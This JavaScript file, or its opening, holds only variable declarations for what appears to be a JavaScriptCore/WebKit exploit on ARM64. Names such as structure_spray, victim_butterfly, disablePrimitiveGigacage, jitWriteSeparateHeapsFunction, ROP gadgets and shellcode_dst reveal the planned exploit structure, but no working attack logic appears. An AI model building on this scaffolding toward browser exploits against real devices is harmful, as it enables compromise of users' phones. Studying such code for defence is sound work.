var TEN = 10;
var HUNDRED = 100;
var THOUSAND = 1000;
ITERATIONS = TEN*THOUSAND;
ALLOCATIONS = THOUSAND;
var conversion_buffer = new ArrayBuffer(8);
var f64 = new Float64Array(conversion_buffer);
var i32 = new Uint32Array(conversion_buffer);
var BASE32 = 0x100000000;
counter = 0;
var workbuf = new ArrayBuffer(0x1000000)
var u32_buffer = new Uint32Array(workbuf);
var u8_buffer = new Uint8Array(workbuf);
var shellcode_length = 0;
var structure_spray = [];
var manager = null;
var unboxed_size = 100;
var unboxed = null;
var boxed = null;
var victim = {};
var outer = {};
var fake_addr = 0;
var unboxed_addr = 0;
var boxed_addr = 0;
var victim_addr = 0;
var holder = {};
var shared_butterfly = 0;
var boxed_butterfly = 0;
var victim_butterfly = 0;
var stage1 = {};
var stage2 = {};
var wrapper = null;
var wrapper_addr = 0;
var el_addr = 0;
var vtab_addr = 0;
var slide = 0;
var disablePrimitiveGigacage = 0;
var callbacks = 0;
var g_gigacageBasePtrs = 0;
var g_typedArrayPoisons = 0;
var longjmp = 0;
var dlsym = 0;
var startOfFixedExecutableMemoryPool = 0;
var endOfFixedExecutableMemoryPool = 0;
var jitWriteSeparateHeapsFunction = 0;
var useFastPermisionsJITCopy = 0;
var ptr_stack_check_guard = 0;
var pop_x8 = 0;
var pop_x2 = 0;
var linkcode_gadget = 0;
var callback_vector = 0;
var poison = 0;
var buffer_addr = 0;
var shellcode_src = 0;
var shellcode_dst = 0;
var fake_stack = [];